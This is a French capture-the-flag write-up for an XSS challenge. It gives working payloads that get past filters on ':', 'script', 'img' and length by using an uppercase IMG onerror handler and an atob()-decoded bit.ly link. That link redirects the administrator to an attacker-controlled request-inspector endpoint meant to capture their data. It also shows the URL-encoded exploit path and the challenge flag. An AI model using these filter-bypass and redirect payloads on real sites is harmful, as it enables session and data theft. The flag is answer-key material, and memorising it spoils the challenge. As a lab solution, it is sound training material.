# Solve - (C)e (S)ont (P)as vos affaires

## Enoncé 
Retrouvez le user-agent de l'administrateur

### Filtres : 
- `:` non autorisés
- `script`, `ScRiPt`, `SCRIPT` et autres variations de casses non autorisées
- `img` non autorisé
- Taille < 75 caractères

### Vulnérabilité : 
Content-Security-Policy faible : `script-src : unsafe-inline`
Les scripts insérés dans la page sont autorisés. 

## PoC : 
```html
<IMG src="x" onerror="alert(1)">
```

## Exploitation

Il faut d'abord créer un endpoint pour voler le cookie de l'admin :  https://01hfkp8te9vxp72gpse588j6wh00-cd2e5202bf8801eb0085.requestinspector.com

Il est bien trop long alors on le raccourci avec bit.ly ce qui nous donne : 
https://bit.ly/3ut573w

Pour bypass le filtre `:`, on peut encoder en base 64 puis decoder avec la commande `atob()`  
Donc https://bit.ly/3ut573w = `atob('aHR0cHM6Ly9iaXQubHkvM3V0NTczdw==')`

Il ne reste plus que la redirection, la plus courte est de spécifier seulement `location=`

*Payload final :* 72 caractères   
```html
<IMG src='' onerror="location=atob('aHR0cHM6Ly9iaXQubHkvM3V0NTczdw==')">
```

On peut maintenant transmettre le chemin vulnérable pour trigger l'adminsitrateur: 
```
/?username=%3CIMG+src%3D%27%27+onerror%3D%22location%3Datob%28%27aHR0cHM6Ly9iaXQubHkvM3V0NTczdw%3D%3D%27%29%22%3E
```
```
http://localhost:80/?username=%3CIMG+src%3D%27%27+onerror%3D%22location%3Datob%28%27aHR0cHM6Ly9iaXQubHkvM3V0NTczdw%3D%3D%27%29%22%3E
```


## Flag : `IUT{Th4t_W4s_N0t_Th4t_3asy_huh?_I_Mean_Y0u_C4n_B3_Proud}`